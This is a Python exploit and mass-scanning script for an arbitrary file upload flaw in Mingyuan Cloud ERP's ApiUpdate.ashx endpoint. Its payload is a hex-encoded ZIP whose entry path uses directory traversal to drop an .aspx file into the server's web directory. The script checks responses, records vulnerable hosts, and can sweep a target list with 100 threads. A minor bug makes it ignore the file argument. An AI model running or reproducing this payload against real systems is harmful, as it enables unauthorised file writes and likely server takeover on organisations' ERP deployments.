import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test ="""
    __  ____           __  __              __  __                  __________  ____ 
   /  |/  (_)___  ____ \ \/ /_  ______ ____\ \/ /_  ______        / ____/ __ \/ __ \
  / /|_/ / / __ \/ __ `/\  / / / / __ `/ __ \  / / / / __ \______/ __/ / /_/ / /_/ /
 / /  / / / / / / /_/ / / / /_/ / /_/ / / / / / /_/ / / / /_____/ /___/ _, _/ ____/ 
/_/  /_/_/_/ /_/\__, / /_/\__,_/\__,_/_/ /_/_/\__,_/_/ /_/     /_____/_/ |_/_/      
               /____/                                                               
"""
    print(test)
def main():
    banner()
    parse = argparse.ArgumentParser(description="明源云ERP系统接口管家ApiUpdate.ashx任意文件上传漏洞")
    parse.add_argument('-u','--url',dest='url',type=str,help="please input you url")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input you file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    payload = "/myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a"
    headers = {
        'Accept-Encoding':'gzip',
        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_14_3)AppleWebKit/605.1.15(KHTML,likeGecko)Version/12.0.3Safari/605.1.15',
        'Content-Length':'856',
    }
    data = '{{hexdec(504B030414000000080063740E576AE37B2383000000940000001D0000002E2E2F2E2E2F2E2E2F666463636C6F75642F5F2F746573742E6173707825CC490AC2401404D0BDA7685A02C9A62F90288A22041C42E2B0FE4A11033DD983E0EDFDE2AEA8575453AC444723C49EEC98392CE4662E45B16C185AE35D48E24806D1D3836DF8C404A3DAD37F227A066723D42D4C09A53C23A66BD65656F56ED2505B68703F20BC11D4817C47E959F678651EAA4BD06A7D8F4EE7841F5455CDB7B32F504B0102140314000000080063740E576AE37B2383000000940000001D00000000000000000000008001000000002E2E2F2E2E2F2E2E2F666463636C6F75642F5F2F746573742E61737078504B050600000000010001004B000000BE0000000000)}}'
    try:
        res1 = requests.get(url=target+payload,headers=headers,data=data,verify=False)
        if res1.status_code==200 and 'OK' in res1.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            return False
    except Exception as e:
        return False

if __name__ == "__main__":
    main()